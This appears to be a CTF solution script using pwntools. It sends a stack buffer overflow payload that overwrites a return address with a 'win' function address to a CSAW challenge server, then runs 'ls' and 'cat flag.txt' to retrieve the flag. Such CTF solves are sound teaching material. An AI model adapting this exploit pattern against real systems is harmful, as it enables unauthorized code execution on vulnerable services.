#!/usr/bin/env python3

from pwn import *
import base64
import sys

buf = b'A'*32
pad = b'B'*8 # why not 12?
win = p64(0x0000000000401162)

payload = buf + pad + win

with open('payload.in','wb') as f:
    f.write(payload)

print("Not super reliable; if it hangs just do ^C and try running again\n")

p = remote('pwn.red.csaw.io',5002)

print(p.recv().decode('ascii'))

p.sendline(payload)

print('ls')
p.sendline("ls")

print(p.recv().decode('ascii'))

print('cat flag.txt')
p.sendline("cat flag.txt")

print(p.recv().decode('ascii'))

p.close()

